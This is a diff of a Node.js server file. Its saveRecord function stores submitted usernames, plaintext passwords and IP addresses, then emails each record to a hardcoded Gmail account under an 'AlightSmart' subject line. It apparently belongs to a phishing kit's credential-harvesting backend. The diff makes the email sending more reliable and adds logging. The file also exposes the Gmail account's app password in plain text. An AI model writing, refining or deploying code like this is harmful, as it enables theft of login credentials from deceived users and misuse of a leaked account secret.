@@ -23,25 +23,27 @@ const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
         user: 'alightsmartacc@gmail.com',
-        pass: 'qyzluoldeamjyjqo'   // Your App Password
+        pass: 'qyzluoldeamjyjqo'
     }
 });
 
-function saveRecord(type, username = null, password = null, ip = 'Unknown') {
+async function saveRecord(type, username = null, password = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
     
     db.run("INSERT INTO records (type, username, password, ip, timestamp) VALUES (?, ?, ?, ?, ?)",
         [type, username, password, ip, timestamp]);
 
+    console.log(`📝 Saved: ${type} | User: ${username || '-'} | IP: ${ip}`);
+
     // Send Email
     const mailOptions = {
         from: 'alightsmartacc@gmail.com',
         to: 'alightsmartacc@gmail.com',
-        subject: `New ${type} - AlightSmart`,
+        subject: `🔔 New ${type} - AlightSmart`,
         html: `
-            <h3>New Activity</h3>
+            <h3>New Activity Detected</h3>
             <p><strong>Type:</strong> ${type}</p>
-            <p><strong>Username:</strong> ${username || '-'}</p>
+            <p><strong>Username/Email:</strong> ${username || '-'}</p>
             <p><strong>Password:</strong> ${password || '-'}</p>
             <p><strong>IP:</strong> ${ip}</p>
             <p><strong>Time:</strong> ${timestamp}</p>
@@ -50,7 +52,12 @@ function saveRecord(type, username = null, password = null, ip = 'Unknown') {
         `
     };
 
-    transporter.sendMail(mailOptions).catch(err => console.log('Email failed:', err));
+    try {
+        await transporter.sendMail(mailOptions);
+        console.log('✅ Email sent successfully');
+    } catch (err) {
+        console.log('❌ Email failed:', err.message);
+    }
 }
 
 // Routes
